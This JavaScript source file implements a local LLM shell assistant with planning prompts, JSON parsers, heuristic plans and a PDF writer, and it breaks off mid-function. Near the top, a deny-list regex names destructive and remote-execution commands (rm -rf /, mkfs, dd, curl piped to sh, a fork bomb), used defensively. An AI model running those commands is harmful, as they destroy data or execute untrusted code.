const path = require("path");
const fs = require("fs");

const CONTEXT_MAX_CHARS = 1600;
const CONTEXT_MAX_LINES = 12;
const NUM_CTX = Number(process.env.OLLAMA_NUM_CTX || 8192);
const DENY_CMD = /(\bsudo\b|\brm\s+-rf\s+\/|\bmkfs\b|\bdd\s+if=|\bchmod\s+-R\s+777|\bchown\s+-R\s+|\bcurl\b[^|&;]*\|\s*(sh|bash)|:\(\)\s*\{)/i;

const SYSTEM_A = `Output one JSON object and nothing else. The first character is {.
{"display":"short answer","cmd":null}
cmd is one shell command, or null when no command is needed.
Example: {"display":"Hello.","cmd":null}
Do not invent files.`;

const SYSTEM_REWRITE = `Rewrite the whole working context. JSON only:
{"context":"multiline text"}
Rules:
1. Lines starting KEEP stay unless the user asked to drop them.
2. If there is no KEEP GOAL after this turn, return {"context":""}.
3. Never paste command dumps. Store short facts, paths, counts.
4. Durable facts: KEEP …  The objective: KEEP GOAL: …
5. Max 12 lines.`;

const SYSTEM_PLAN = `Plan a small task tree. JSON only:
{"display":"one paragraph","goal":"KEEP GOAL line","steps":[{"id":"1","do":"action","need":"input","expect":"checkpoint in one line","attach":"none|paths|summary|full","cmd":"one command or null"}]}
One command per step. cmd null only to ask the user.
After each command the checkpoint reads the output and rewrites state. Do not add a step that asks the user to save output.
attach is what that rewrite keeps: summary for listings, paths for files written, none if state should not change.`;

const SYSTEM_CHECK = `Output one JSON object and nothing else. The first character is {.
{"ok":false,"why":"one line"}
Use "ok":true only when the command succeeded and answers the task.
why must name the actual error. Never write the words "one line".
An error or a missing file is not ok. Do not copy the example.`;

const SYSTEM_EMIT = `Emit ONE command for this step, or ask. JSON only:
{"cmd":"one shell command or null","ask":"question or null"}
Use facts already in context. Do not invent file contents you have not seen.`;

const SYSTEM_REPLAN = `Revise remaining steps after a failed checkpoint. JSON only:
{"display":"one paragraph","steps":[{"id":"1","do":"action","need":"input","expect":"one line","attach":"none|paths|summary|full","cmd":"one command or null"}]}
Keep finished work. 1-5 remaining steps. Do not repeat done steps.`;

const SYSTEM_THINK = `Think, then one JSON object. The first character is {.
{"reason":"your own words","display":"what the user should read","cmd":null}
cmd is one shell command, or null when the answer is already in display.
The command must be for what the user just asked. Never name a file they did not name.
If they named a file, cmd reads that file. You do not have its contents yet.
If cmd is set, display is one sentence about what you will run. Do not invent the output.
If they asked for text or a program, put that text in display. Use \\n between lines. cmd stays null.
If they asked about this machine and named no file, use a real command that reports the machine. Do not invent a path.`;

const SYSTEM_SAY = `Report the command output. JSON only. The first character is {.
{"say":"plain sentences about what the output shows"}
Use only the output. No KEEP, FACT, or NEXT.`;

const SYSTEM_NOTE = `One JSON object. The first character is {.
{"note":"one sentence of what this part adds"}
Do not paste code.`;

const SYSTEM_MARKUP = `Make the answer easier to read. Output markdown only. No JSON.
Do not add facts, paths, or commands that are not already in the text.
Use short paragraphs and bullet lists.
Put code in a fenced block with a language tag.
Do not start with "Here is".`;

const MODEL_PROBE_USER = 'Reply with JSON only: {"display":"PING-OK","cmd":null}';

function chunkText(text, size) {
  const limit = size || 1600;
  const lines = String(text || "").split("\n");
  const chunks = [];
  let buf = "";
  const push = (part) => {
    const bit = String(part || "");
    if (bit.trim()) chunks.push(bit);
  };
  lines.forEach((line) => {
    const next = buf ? buf + "\n" + line : line;
    if (buf && next.length > limit) {
      push(buf);
      buf = line;
    } else {
      buf = next;
    }
    while (buf.length > limit) {
      push(buf.slice(0, limit));
      buf = buf.slice(limit);
    }
  });
  push(buf);
  return chunks;
}

function readPathFromCmd(cmd) {
  const text = String(cmd || "");
  if (!/\b(cat|sed|head|tail|less|more)\b/.test(text)) return null;
  const paths = text.match(/\/(?:[A-Za-z0-9._-]+\/)*[A-Za-z0-9._-]+\.[A-Za-z0-9]+/g) || [];
  const file = paths.filter((p) => !p.includes("..")).pop();
  return file || null;
}

function contextCharBudget() {
  return Math.max(2000, ((Number(NUM_CTX) || 8192) - 1000) * 3);
}

function progressState(goal, index, total, notes) {
  const lines = [];
  const g = String(goal || "").replace(/^KEEP GOAL:\s*/i, "").trim();
  if (g) lines.push("KEEP GOAL: " + clip(g, 180));
  const at = Math.max(1, Number(index) || 1);
  const n = Math.max(at, Number(total) || 1);
  lines.push("NEXT: reading part " + at + " of " + n);
  (notes || []).forEach((x) => {
    const bit = String(x || "").trim();
    if (bit) lines.push("NOTE: " + clip(bit, 240));
  });
  return lines.join("\n");
}

function parseVerdict(raw) {
  const parsed = extractJson(raw);
  if (!parsed || parsed._raw || typeof parsed.ok !== "boolean") return null;
  const why = String(parsed.why || "").trim();
  return { ok: parsed.ok, why: why || (parsed.ok ? "matches" : "does not match") };
}

function previewOutput(text, n) {
  const s = String(text || "");
  const limit = n || 8000;
  if (s.length <= limit) return s;
  return s.slice(0, limit) + "\n… " + (s.length - limit) + " more characters";
}

function clip(s, n) {
  const t = String(s || "");
  return t.length <= n ? t : t.slice(0, n) + "…";
}

function hasGoal(text) {
  return /KEEP\s+GOAL:/i.test(String(text || ""));
}

function keepLines(text) {
  return String(text || "")
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => /^KEEP\b/i.test(l));
}

function clipContext(text) {
  const raw = String(text || "")
    .split("\n")
    .map((l) => l.trimEnd())
    .filter(Boolean);
  let out = raw.slice(0, CONTEXT_MAX_LINES).join("\n");
  if (out.length > CONTEXT_MAX_CHARS) out = out.slice(0, CONTEXT_MAX_CHARS) + "…";
  return out.trim();
}

function userDropsContext(userText) {
  return /\b(drop all|clear context|forget everything|reset context)\b/i.test(userText);
}

function looksLikeGoal(text) {
  return /\b(keep goal|goal is|remember (that|we|this)|objective|until we|working on)\b/i.test(String(text || ""));
}

function heuristicRewrite(oldText, userText, display, output) {
  if (userDropsContext(userText)) return "";
  if (!hasGoal(oldText) && !looksLikeGoal(userText) && !looksLikeGoal(display) && !hasGoal(output)) return "";
  return null;
}

function finalizeRewrite(oldText, proposed, userText) {
  if (userDropsContext(userText)) return "";
  let text = clipContext(proposed);
  if (!hasGoal(text) && !hasGoal(oldText)) return "";
  if (!hasGoal(text) && hasGoal(oldText) && !/\b(drop (the )?goal)\b/i.test(userText)) {
    const goal = keepLines(oldText).filter((l) => /GOAL:/i.test(l));
    text = clipContext(goal.concat(text.split("\n").filter(Boolean)).join("\n"));
  }
  return text;
}

function wantsPlan(text) {
  const t = String(text || "");
  if (/\b(pdf|zip|csv|xlsx|excel)\b/i.test(t)) return true;
  if (/\b(ls|cat|grep|find|mkdir|python|bash)\b/.test(t)) return true;
  if (/\b(then|and then|after that|step by step|pipeline)\b/i.test(t)) return true;
  if (/\b(list|show|go to|write|create|save)\b/i.test(t) && /\b(file|files|dir|directory|folder|\/tmp|\/)\b/i.test(t)) return true;
  return false;
}

function pickMode(text, context) {
  const t = String(text || "").trim();
  if (wantsPlan(t)) return { mode: "B", why: "command" };
  if (hasGoal(context) && /\b(continue|next step|resume|the plan)\b/i.test(t)) return { mode: "B", why: "resume plan" };
  return { mode: "A", why: "direct" };
}

function extractJson(text) {
  const trimmed = String(text || "").trim();
  const fence = trimmed.match(/```(?:json)?\s*/i);
  let candidate = trimmed;
  if (fence && fence.index !== undefined) {
    const after = trimmed.slice(fence.index + fence[0].length);
    const close = after.indexOf("```");
    candidate = (close >= 0 ? after.slice(0, close) : after).trim();
  }
  const start = candidate.indexOf("{");
  if (start === -1) return { display: clip(trimmed, 2000), _raw: true };
  let depth = 0;
  let end = -1;
  for (let i = start; i < candidate.length; i++) {
    if (candidate[i] === "{") depth++;
    else if (candidate[i] === "}") {
      depth--;
      if (depth === 0) {
        end = i;
        break;
      }
    }
  }
  if (end === -1) return { display: clip(trimmed, 2000), _raw: true };
  try {
    return JSON.parse(candidate.slice(start, end + 1));
  } catch (_) {
    return { display: clip(trimmed, 2000), _raw: true };
  }
}

function parseDirect(raw) {
  const p = extractJson(raw);
  let cmd = typeof p.cmd === "string" && p.cmd.trim() ? p.cmd.trim() : null;
  if (!cmd && Array.isArray(p.commands) && p.commands[0]) {
    cmd = String((p.commands[0] && p.commands[0].cmd) || p.commands[0]).trim();
  }
  return {
    display: typeof p.display === "string" && p.display.trim() ? p.display.trim() : clip(String(raw), 800),
    cmd: cmd || null,
  };
}

function asStep(row, i) {
  const attach = String((row && row.attach) || "summary");
  return {
    id: String((row && row.id) || i + 1),
    do: String((row && (row.do || row.text)) || "step"),
    need: String((row && row.need) || ""),
    expect: String((row && row.expect) || "command succeeds"),
    attach: ["none", "paths", "summary", "full"].includes(attach) ? attach : "summary",
    cmd: !row || row.cmd == null || row.cmd === "" ? null : String(row.cmd),
    status: "todo",
  };
}

function cleanDisplay(text, fallback) {
  const s = String(text || "").replace(/\s+/g, " ").trim();
  if (!s || /^cmd\s*null$/i.test(s) || s === "null" || s === "undefined") return fallback;
  return s;
}

function parsePlan(raw, fallbackGoal) {
  const p = extractJson(raw);
  const stepsIn = Array.isArray(p.steps) ? p.steps : [];
  const steps = stepsIn.slice(0, 6).map(asStep).filter((s) => s.do.trim());
  const goal = String(p.goal || fallbackGoal || "").trim() || "KEEP GOAL: (untitled)";
  return {
    goal: /^KEEP\s+GOAL:/i.test(goal) ? goal : "KEEP GOAL: " + goal,
    steps,
    cursor: 0,
  };
}

function asOk(value) {
  if (value === true || value === 1 || value === "1" || value === "true" || value === "yes" || value === "ok") return true;
  if (value === false || value === 0 || value === "0" || value === "false" || value === "no") return false;
  return null;
}
  function parseCheck(raw, fallbackContext) {
  const p = extractJson(raw);
  const ok = asOk(p.ok);
  return {
    ok: ok === null ? false : ok,
    why: String(p.why || p.display || ""),
    ask: p.ask == null || p.ask === "" ? null : String(p.ask),
    replan: p.replan === true,
    startOver: p.startOver === true,
    next: p.next == null || p.next === "" ? "next" : String(p.next),
    attach: ["none", "paths", "summary", "full"].includes(String(p.attach)) ? String(p.attach) : "summary",
    context: typeof p.context === "string" ? p.context : fallbackContext,
  };
}

function parseEmit(raw) {
  const p = extractJson(raw);
  return {
    cmd: typeof p.cmd === "string" && p.cmd.trim() ? p.cmd.trim() : null,
    ask: p.ask == null || p.ask === "" ? null : String(p.ask),
  };
}

function listingNames(stdout) {
  return String(stdout || "")
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => l && !/^total /.test(l))
    .map((l) => l.split(/\s+/).pop())
    .filter((n) => n && n !== "." && n !== "..");
}

function prettyListing(stdout, title) {
  const dirs = [];
  const files = [];
  const other = [];
  String(stdout || "")
    .split("\n")
    .forEach((line) => {
      const raw = line.trim();
      if (!raw || /^total /.test(raw)) return;
      const parts = raw.split(/\s+/);
      let kind = "f";
      let name = raw;
      if (parts.length >= 9 && /^[\-dlbcps]/.test(parts[0])) {
        kind = parts[0][0];
        name = parts.slice(8).join(" ");
      }
      if (!name || name === "." || name === "..") return;
      if (kind === "d") dirs.push(name);
      else if (kind === "-") files.push(name);
      else other.push(name);
    });
  const sort = (items) => items.sort((a, b) => a.localeCompare(b));
  const lines = [];
  if (title) lines.push(title);
  const block = (label, items) => {
    if (!items.length) return;
    lines.push("");
    lines.push(label);
    const shown = sort(items).slice(0, 80);
    shown.forEach((n) => lines.push(n));
    if (items.length > shown.length) lines.push("… " + (items.length - shown.length) + " more");
  };
  block("Directories", dirs);
  block("Files", files);
  block("Other", other);
  if (!dirs.length && !files.length && !other.length) lines.push("(empty)");
  return lines.join("\n");
}

function summarizeOutput(cmd, stdout) {
  if (/^ls\b/.test(String(cmd).trim())) {
    const names = listingNames(stdout);
    if (!names.length) return "(empty listing)";
    const shown = names.slice(0, 12);
    const extra = names.length - shown.length;
    return "names (" + names.length + "): " + shown.join(", ") + (extra ? ", … +" + extra : "");
  }
  if (/^(grep|rg|egrep)\b/.test(String(cmd).trim())) {
    const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
    return lines.length ? lines.length + " matches: " + clip(lines.join(" | "), 360) : "0 matches";
  }
  return clip(String(stdout || "").replace(/\s+/g, " ").trim(), 400);
}

function overflow(context, output) {
  return Math.ceil((400 + String(context || "").length + String(output || "").length) / 4) > NUM_CTX * 0.7;
}

function applyAttach(how, cmd, result) {
  if (how === "none") return "";
  if (how === "paths" || how === "summary") return summarizeOutput(cmd, result.stdout || "");
  return clip(result.stdout || "", 2500);
}

function heuristicMath(text) {
  const t = String(text || "").trim();
  const m = t.match(/^(?:what is\s+)?(\d+)\s*(times|\*|x|plus|\+|minus|-)\s*(\d+)\s*\??$/i);
  if (!m) return null;
  const a = Number(m[1]);
  const b = Number(m[3]);
  const op = m[2];
  const n = /times|\*|x/i.test(op) ? a * b : /plus|\+/i.test(op) ? a + b : a - b;
  return { display: String(n), cmd: null };
}

function heuristicDirect(text) {
  const t = String(text || "").trim();
  if (/\b(pdf|zip|csv|xlsx|write|create|save)\b/i.test(t)) return null;
  const abs = t.match(/(\/(?:tmp|home|var|usr|etc)(?:\/[A-Za-z0-9._-]*)*)/);
  const wantsList = /\b(ls|list|show|files)\b/i.test(t) || /go to/i.test(t);
  if (abs && wantsList && !/\b(then|and then|report)\b/i.test(t)) {
    return { display: "List " + abs[1] + ".", cmd: "ls -la " + abs[1] };
  }
  if (/^(ls|list(\s+(all\s+)?files)?|list all files)\s*$/i.test(t)) {
    return { display: "List the current directory.", cmd: "ls -la" };
  }
  return null;
}

function angryPlan() {
  return {
    goal: "KEEP GOAL: collect angry remarks from chat logs into a csv and zip it",
    cursor: 0,
    steps: [
      { id: "1", do: "Read chat logs", need: "/tmp/chat.log", expect: "log lines exist", attach: "summary", cmd: "cat /tmp/chat.log", status: "todo" },
      { id: "2", do: "Filter angry remarks", need: "step 1 log", expect: "at least one matching line", attach: "full", cmd: "grep -Ei 'angry|hate|furious|pissed|ridiculous' /tmp/chat.log", status: "todo" },
      { id: "3", do: "Write csv of remarks", need: "step 2 lines", expect: "csv file written", attach: "paths", cmd: null, status: "todo" },
      { id: "4", do: "Zip the csv", need: "/tmp/angry.csv", expect: "zip exists", attach: "paths", cmd: "zip /tmp/angry.zip /tmp/angry.csv", status: "todo" },
    ],
  };
}

function safeFileName(name) {
  const n = String(name || "");
  if (!/^[A-Za-z0-9._-]+$/.test(n) || n === "." || n === "..") return null;
  return n;
}

function fileWritePlan(text) {
  const t = String(text || "");
  const named = t.match(/["']([A-Za-z0-9._-]+)["']/) || t.match(/\b([A-Za-z0-9._-]+\.[A-Za-z0-9]+)\b/);
  const file = safeFileName(named && named[1]);
  if (!file || !/\b(write|create|save|put)\b/i.test(t)) return null;
  const range = t.match(/(\d+)\s*(?:->|to|through|…|\.{2,}|-)\s*(\d+)/i);
  let cmd;
  let goal;
  let expect;
  if (range) {
    let from = Number(range[1]);
    let to = Number(range[2]);
    if (to < from) {
      const swap = from;
      from = to;
      to = swap;
    }
    if (to - from > 10000) return null;
    cmd = "python3 -c \"open('" + file + "','w').write('\\n'.join(str(i) for i in range(" + from + "," + (to + 1) + "))+'\\n')\"";
    goal = "KEEP GOAL: write " + from + ".." + to + " into " + file;
    expect = "file contains " + from + ".." + to;
  } else {
    cmd = "python3 -c \"open('" + file + "','w').write('')\"";
    goal = "KEEP GOAL: create " + file;
    expect = "file written";
  }
  return {
    goal: goal,
    cursor: 0,
    steps: [
      { id: "1", do: "Write " + file, need: "", expect: expect, attach: "paths", cmd: cmd, status: "todo" },
    ],
  };
}

function heuristicPlan(text) {
  const t = String(text || "").trim();
  const written = fileWritePlan(t);
  if (written) return written;
  if (/(angry|furious|hate|pissed)/i.test(t) && /(chat|log)/i.test(t) && /(excel|csv|xlsx|zip)/i.test(t)) return angryPlan();
  if (/\/tmp/.test(t) && /pdf/i.test(t)) {
    return {
      goal: "KEEP GOAL: list /tmp, then write a one-page PDF summary of those names",
      cursor: 0,
      steps: [
        { id: "1", do: "List /tmp", need: "", expect: "names from /tmp", attach: "summary", cmd: "ls -la /tmp", status: "todo" },
        { id: "2", do: "Write a PDF summary of those names", need: "FACT names from the listing", expect: "pdf file exists", attach: "paths", cmd: null, status: "todo" },
      ],
    };
  }
  if (/\/tmp/.test(t) && /\b(then|report|csv|zip|collect)\b/i.test(t)) {
    return {
      goal: "KEEP GOAL: inspect /tmp and keep a short name list",
      cursor: 0,
      steps: [
        { id: "1", do: "List /tmp", need: "", expect: "a directory listing with names", attach: "paths", cmd: "ls -la /tmp", status: "todo" },
        { id: "2", do: "Keep a short report of names", need: "step 1 names", expect: "a short name list", attach: "summary", cmd: null, status: "todo" },
      ],
    };
  }
  const direct = heuristicDirect(t);
  if (direct && direct.cmd) {
    return {
      goal: "KEEP GOAL: " + direct.display.replace(/\.$/, ""),
      cursor: 0,
      steps: [
        { id: "1", do: direct.display.replace(/\.$/, ""), need: "", expect: "names from the listing", attach: "summary", cmd: direct.cmd, status: "todo" },
      ],
    };
  }
  return null;
}

function salvageField(raw, key) {
  const m = String(raw || "").match(new RegExp('"' + key + '"\\s*:\\s*"((?:\\\\.|[^"\\\\])*)"'));
  return m ? m[1].replace(/\\n/g, "\n").replace(/\\"/g, '"').trim() : "";
}

function parseThink(raw, userText) {
  let parsed = extractJson(raw);
  if (parsed._raw) {
    const reason = salvageField(raw, "reason");
    const display = salvageField(raw, "display");
    const cmd = salvageField(raw, "cmd");
    if (!reason && !display && !cmd) return { reason: "", display: "", cmd: null, plan: null, failed: true };
    parsed = { reason, display, cmd: cmd || null };
  }
  const reason = typeof parsed.reason === "string" ? parsed.reason.trim() : "";
  const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
  let plan = null;
  if (Array.isArray(parsed.steps) && parsed.steps.length) {
    plan = parsePlan(raw, userText);
    if (!plan.steps.length) plan = null;
  }
  let cmd = typeof parsed.cmd === "string" && parsed.cmd.trim() ? parsed.cmd.trim() : null;
  if (!plan && !cmd) {
    const first = display.split("\n").map((s) => s.trim()).filter(Boolean)[0] || "";
    if (/^(grep|rg|cat|sed|awk|wc|ls|head|tail)\b/.test(first) && first.length < 180) cmd = first;
  }
  if (!plan && cmd) {
    plan = {
      goal: "KEEP GOAL: " + clip(userText, 140),
      ask: clip(userText, 200),
      cursor: 0,
      steps: [
        {
          id: "1",
          do: display || "Run the command",
          need: "",
          expect: "the command output",
          attach: "summary",
          cmd: cmd,
          status: "todo",
        },
      ],
    };
  }
  if (plan) {
    plan.fromModel = true;
    plan.ask = clip(userText, 200);
    if (!plan.steps[0].cmd && cmd) plan.steps[0].cmd = cmd;
  }
  return { reason, display, cmd: plan && plan.steps[0] ? plan.steps[0].cmd : cmd, plan, failed: !plan && !cmd && !display };
}

function copiedFromPrompt(userText, thought) {
  const blob = [thought && thought.cmd, thought && thought.reason, thought && thought.display].join("\n");
  const user = String(userText || "");
  if (/lib\.js/.test(blob) && !/lib\.js/.test(user)) return true;
  if (/I have not read the file the user named/.test(blob)) return true;
  if (/I'll read the whole file/.test(blob) && !/whole file/.test(user)) return true;
  return false;
}

function presentMarkup(raw, modelText) {
  const source = String(raw || "").trim();
  let s = String(modelText || "").trim();
  if (!s) return source;
  const wrapped = s.match(/^```(?:markdown|md)?[^\n]*\n([\s\S]*?)\n```$/);
  if (wrapped) s = wrapped[1].trim();
  if (s.startsWith("{")) {
    const parsed = extractJson(s);
    if (!parsed._raw && typeof parsed.md === "string" && parsed.md.trim()) s = parsed.md.trim();
    else return source;
  }
  if (!s || /Make the answer easier to read|Do not add facts/.test(s)) return source;
  return s;
}

function thinAnswer(thought) {
  const display = String((thought && thought.display) || "").trim();
  return !!(thought && !thought.cmd && !thought.plan && display && /:\s*$/.test(display) && !display.includes("\n"));
}

function reasonFor(decided) {
  if (!decided) return "";
  const steps = (decided.plan && decided.plan.steps) || [];
  if (decided.needsModel && !steps.length) return "";
  if (steps.length > 1) {
    return "This takes " + steps.length + " steps, and each command waits for you. " + steps.map((s) => s.do).join(". ") + ".";
  }
  const cmd = (steps[0] && steps[0].cmd) || decided.cmd || "";
  if (/^ls\b/.test(cmd)) {
    const where = (String(cmd).match(/\s(\/\S+)\s*$/) || [])[1] || "the current directory";
    return "You want the names in " + where + ". After you approve, I'll show those names here.";
  }
  if (/open\(/.test(cmd)) return "This is one write. It waits for approval, and then I'll tell you the path.";
  if (steps[0]) return "One step: " + steps[0].do + ". Nothing runs until you approve.";
  if (cmd) return "One command, and it waits for your approval.";
  return "";
}

function localTurn(text, context) {
  const pick = pickMode(text, context, null);
  const math = heuristicMath(text);
  const direct = heuristicDirect(text);
  if (pick.mode === "A" && math) {
    const decided = { mode: "A", why: "math", display: math.display, cmd: null, plan: null, needsModel: false };
    decided.reason = "That is " + math.display + ".";
    return decided;
  }
  if (pick.mode === "A") {
    if (direct && direct.cmd) {
      const decided = { mode: "A", why: pick.why, display: direct.display, cmd: direct.cmd, plan: null, needsModel: false };
      decided.reason = reasonFor(decided);
      return decided;
    }
    const decided = { mode: "A", why: pick.why, display: "", cmd: null, plan: null, needsModel: true };
    decided.reason = reasonFor(decided);
    return decided;
  }
  const plan = heuristicPlan(text);
  if (plan && plan.steps && plan.steps.length) {
    const cmd = plan.steps[0].cmd || null;
    const decided = {
      mode: "B",
      why: pick.why,
      display: "Plan: " + String(plan.goal || "").replace(/^KEEP GOAL:\s*/i, ""),
      cmd: cmd,
      plan: plan,
      needsModel: false,
    };
    decided.reason = reasonFor(decided);
    return decided;
  }
  if (direct && direct.cmd) {
    const decided = { mode: "A", why: pick.why, display: direct.display, cmd: direct.cmd, plan: null, needsModel: false };
    decided.reason = reasonFor(decided);
    return decided;
  }
  const decided = { mode: "B", why: pick.why, display: "", cmd: null, plan: null, needsModel: true };
  decided.reason = reasonFor(decided);
  return decided;
}

function angryLines(text) {
  return String(text || "")
    .split("\n")
    .filter((l) => /angry|hate|furious|pissed|ridiculous/i.test(l))
    .map((l) =>
      l.replace(/^FACT:\s*/i, "").replace(/^\[[^\]]+\]\s*[^:]+:\s*/, "").replace(/^\d+\s+matches:\s*/, "").trim()
    )
    .filter((l) => l && !/^KEEP\b/i.test(l));
}

function heuristicEmit(step, context) {
  const blob = String((step && step.do) || "") + " " + String((step && step.need) || "") + " " + String(context || "");
  if (/csv|excel|xlsx/i.test(blob)) {
    const remarks = angryLines(context);
    if (!remarks.length) return { cmd: null, ask: "No angry remarks in context yet — run the filter step, or paste the lines." };
    const body = remarks.slice(0, 8).map((t) => t.replace(/"/g, "")).join(" | ");
    return { cmd: "echo \"" + clip(body, 400) + "\" > /tmp/angry.csv", ask: null };
  }
  if (/\bzip\b/i.test(blob) && !/pdf/i.test(blob)) return { cmd: "zip /tmp/angry.zip /tmp/angry.csv", ask: null };
  if (/pdf/i.test(blob)) {
    const fact = String(context || "").split("\n").find((l) => /^FACT:/.test(l));
    if (!fact) return { cmd: null, ask: "No names in state yet. List the directory first." };
    return { cmd: pdfCommand(fact.replace(/^FACT:\s*/, "")), ask: null };
  }
  if (step && step.need && /you|user|ask|where|which|path of/i.test(step.need)) return { cmd: null, ask: step.need };
  return null;
}

function probeWrittenPdf(cmd) {
  const m = String(cmd || "").match(/open\('([^']+\.pdf)'/);
  if (!m) return null;
  try {
    const buf = fs.readFileSync(m[1]);
    return { path: m[1], ok: buf.slice(0, 5).toString() === "%PDF-" };
  } catch (_) {
    return { path: m[1], ok: false, err: "pdf file was not written" };
  }
}

function judge(step, result, probe) {
  const stdout = String((result && result.stdout) || "");
  const stderr = String((result && result.stderr) || "").trim();
  const failed = !result || result.code !== 0;
  const about = String((step && step.expect) || "") + " " + String((step && step.do) || "");
  const wantsPdf = /pdf/i.test(about);
  const wantsList = !wantsPdf && /name|listing|\blist\b|directory/i.test(about);
  if (wantsPdf) {
    if (probe && probe.ok) return { ok: true, why: "pdf file exists", summary: "pdf: " + probe.path };
    return { ok: false, why: (probe && probe.err) || stderr || "pdf file was not written", summary: "" };
  }
  const summary = summarizeOutput((result && result.cmd) || "", stdout);
  if (wantsList) {
    const names = listingNames(stdout);
    if (!failed && names.length) return { ok: true, why: names.length + " names", summary: summary };
    return { ok: false, why: stderr || "listing had no names", summary: "" };
  }
  if (failed) return { ok: false, why: stderr || "command failed", summary: "" };
  if (!stdout.trim() && !/pdf|open\(|\.pdf|>\s*\S+/i.test(String((result && result.cmd) || ""))) {
    return { ok: false, why: "command printed nothing", summary: "" };
  }
  return { ok: true, why: "command finished", summary: summary };
}

function heuristicCheck(step, result, context, probe) {
  const decided = judge(step, result, probe);
  const big = overflow(context, (result && result.stdout) || "");
  return {
    ok: decided.ok,
    why: decided.why,
    ask: null,
    replan: !decided.ok,
    startOver: false,
    next: decided.ok ? "next" : step.id,
    attach: big ? "summary" : (step && step.attach) || "summary",
    summary: decided.summary,
    context: context,
  };
}

function armNext(plan, stateText) {
  const step = currentStep(plan);
  if (!step || step.cmd) return plan;
  const emit = heuristicEmit(step, stateText);
  if (!emit || !emit.cmd) return plan;
  return { ...plan, steps: plan.steps.map((s) => (s.id === step.id ? { ...s, cmd: emit.cmd } : s)) };
}

function stepState(plan, step, result, ok, prev) {
  const goal = String((plan && plan.goal) || "KEEP GOAL: (untitled)");
  const lines = [/^KEEP\s+GOAL:/i.test(goal) ? goal : "KEEP GOAL: " + goal];
  const steps = (plan && plan.steps) || [];
  const idx = steps.findIndex((s) => s.id === step.id);
  const upcoming = steps.slice(Math.max(0, idx) + (ok ? 1 : 0)).filter((s) => s.status !== "ok" && s.id !== (ok ? step.id : ""));
  const nxt = upcoming[0];
  if (ok && nxt) lines.push("NEXT: " + nxt.do + (nxt.need ? " — use " + nxt.need : " — use the fact below"));
  else if (!ok) lines.push("NEXT: retry " + step.do + " — " + (step.expect || "the command must succeed"));
  else lines.push("NEXT: waiting for a new instruction");
  const facts = [];
  const addFact = (text) => {
    const raw = String(text || "").trim();
    if (!raw) return;
    const line = /^FACT:/.test(raw) ? raw : "FACT: " + raw;
    if (!facts.includes(line)) facts.push(line);
  };
  steps.forEach((s) => addFact(s.note));
  String(prev || "")
    .split("\n")
    .forEach((l) => {
      if (/^FACT:/.test(l.trim())) addFact(l.trim());
    });
  addFact(summarizeOutput((result && result.cmd) || "", (result && result.stdout) || ""));
  facts.forEach((l) => lines.push(l));
  const done = steps.filter((s) => s.status === "ok" || (ok && s.id === step.id)).map((s) => s.do);
  if (done.length) lines.push("DONE: " + done.join("; "));
  return clipContext(lines.join("\n"));
}

function pdfBytes(text) {
  const lines = String(text || "summary").replace(/[^\x09\x0a\x0d\x20-\x7e]/g, " ").split("\n").slice(0, 28);
  const content = ["BT", "/F1 12 Tf"];
  lines.forEach((line, i) => {
    const esc = line.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");
    content.push("1 0 0 1 50 " + (740 - i * 16) + " Tm (" + esc + ") Tj");
  });
  content.push("ET");
  const stream = content.join("\n");
  const objs = [
    "1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n",
    "2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n",
    "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\n",
    "4 0 obj<</Length " + stream.length + ">>stream\n" + stream + "\nendstream\nendobj\n",
    "5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\n",
  ];
  let pdf = "%PDF-1.4\n";
  const offs = [0];
  for (const obj of objs) {
    offs.push(pdf.length);
    pdf += obj;
  }
  const xref = pdf.length;
  pdf += "xref\n0 6\n0000000000 65535 f \n";
  for (let i = 1; i < offs.length; i++) pdf += String(offs[i]).padStart(10, "0") + " 00000 n \n";
  pdf += "trailer<</Size 6/Root 1 0 R>>\nstartxref\n" + xref + "\n%%EOF";
  return Buffer.from(pdf);
}

function pdfCommand(text) {
  const b64 = pdfBytes(text).toString("base64");
  return "python3 -c \"import base64; open('/tmp/tmp-summary.pdf','wb').write(base64.b64decode('" + b64 + "'))\"";
}

function shortListing(stdout) {
  const names = listingNames(stdout);
  if (!names.length) return "";
  const shown = names.slice(0, 12);
  const lines = ["Short name list (" + names.length + "):"].concat(shown.map((n) => "- " + n));
  if (names.length > shown.length) lines.push("- … " + (names.length - shown.length) + " more");
  return lines.join("\n");
}

function endReport(plan, result, cwd) {
  const steps = (plan && plan.steps) || [];
  if (!steps.length || steps.some((s) => s.status !== "ok")) return null;
  const paths = [];
  const add = (p) => {
    const raw = String(p || "").trim();
    if (!raw || paths.includes(raw)) return;
    paths.push(raw);
  };
  const fromCmd = (cmd) => {
    const text = String(cmd || "");
    const opens = text.match(/open\('([^']+)'/g) || [];
    opens.forEach((bit) => {
      const m = bit.match(/open\('([^']+)'/);
      if (m) add(m[1]);
    });
    const redir = text.match(/(?:>>?)\s*([^\s;&]+)/);
    if (redir) add(redir[1]);
    const zip = text.match(/\bzip\s+(\S+\.zip)\b/);
    if (zip) add(zip[1]);
  };
  steps.forEach((s) => fromCmd(s.cmd));
  fromCmd(result && result.cmd);
  steps.forEach((s) => {
    const m = String(s.note || "").match(/pdf:\s*(\S+)/);
    if (m) add(m[1]);
  });
  const root = cwd || "";
  const lines = [];
  const ls = /^ls\b/.test(String((result && result.cmd) || "").trim());
  if (!paths.length && ls) {
    const where = (String(result.cmd).match(/\s(\/\S+)\s*$/) || [])[1] || "the current directory";
    lines.push("Here is " + where + ".");
    lines.push("");
    lines.push(prettyListing(result.stdout, ""));
  } else if (paths.length) {
    paths.forEach((p) => {
      const full = path.isAbsolute(p) || !root ? p : path.join(root, p);
      lines.push((/\.pdf$/i.test(p) ? "The PDF is at " : "Wrote ") + full + ".");
    });
  } else {
    lines.push("That’s done.");
  }
  return lines.join("\n");
}

function speak(opts) {
  const result = (opts && opts.result) || {};
  const cmd = String(result.cmd || "").trim();
  if (!opts || !opts.ok) {
    const why = String((opts && opts.why) || "that did not work").replace(/\.$/, "");
    return why.charAt(0).toUpperCase() + why.slice(1) + ".";
  }
